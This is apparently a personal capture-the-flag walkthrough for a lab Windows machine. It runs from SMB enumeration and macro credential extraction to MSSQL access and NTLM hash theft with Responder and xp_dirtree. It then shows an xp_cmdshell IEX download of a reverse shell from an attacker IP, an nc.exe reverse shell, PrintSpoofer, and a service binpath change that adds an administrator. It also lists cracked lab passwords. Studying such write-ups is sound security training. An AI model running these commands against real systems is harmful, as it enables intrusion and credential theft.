nmap scan shows 123 rpc, netbios 139, smb 445, sql server 1433, 5985 for winrm
No webserver, ssh

we do `smbclient -N -L \\\\10.129.237.44`
and we find a reports share
`smbcilent -N \\\\10.129.237.44\\reports` shows an .xlsm file, which is xls macro file
To analyze this, feel free to install olevba from github
But we can also do `unzip file.xlsm`
This open up everything, and now we can view the macro using strings
`strings vbaProject.bin`
Here, we find a password, and in one of the files, we find a user Lucas. Probably not related
But for the user "reporting", the password is, 

Impacket has an sqlclient file impacket-msqlclient
So, `impacket-msqlclient reporting@10.129.237.44 -windows-auth`
-password
we get logged in.
-help
we see enable_xp_cmdshell and discover the user doesnt have permission to perform this

So we are going to steal the hash of the service with
`responder -I tun0` on kali
`exec xp_dirtree "\\10.10.14.34\anyFile"`

we get an ntlm hash from the service mssql-svc, we crack it using john and get password,
corporate568 for the user mssql-svc

Now we relogin using same impacket, and try to run the `enable_xp_cmdshell`
It now works, to test, we do `xp_cmdshell whoami`
The we'll download a nishang powershell there
`xp_cmdshell powershel IEX(New-Object Net.WebClient).downloadString(\"http:10.10.14.34/rshell.ps1\")`
while listening on 1234
we get shell! mssql-svc

---
we have Impersonate token, but it is windows 2019, so appearently, potatoes dont work
will try with printspoofer (but there be an antivirus sitting)
`./PrintSpoofer.exe -i -c "powershell /c more c:\Users\Administrator\Desktop\root.txt"` worked, but wasnt giving us a shell

So, transfer nc.exe over to windows.
`./pf.exe -i -c "powershell /c c:\Users\mssql-svc\Desktop\nc.exe -nv 10.10.14.34 5555 -e powershell"`
this gave us a shell.

send over PowerUp.ps1 and run.
Reveals a password for Administrator, MyUnclesAreMarioAndLuigi!!1!
And reveals a startable service, so we gots to abuse it with
`sc.exe config UsoSvc binpath= "cmd /c net user aj password /add && net localgroup Administrators aj /add" obj= LocalSystem`
then stop and start the service. `Restart-Service UsoSvc`
We now need to create a secure-string object and login. refer [[Zeno]]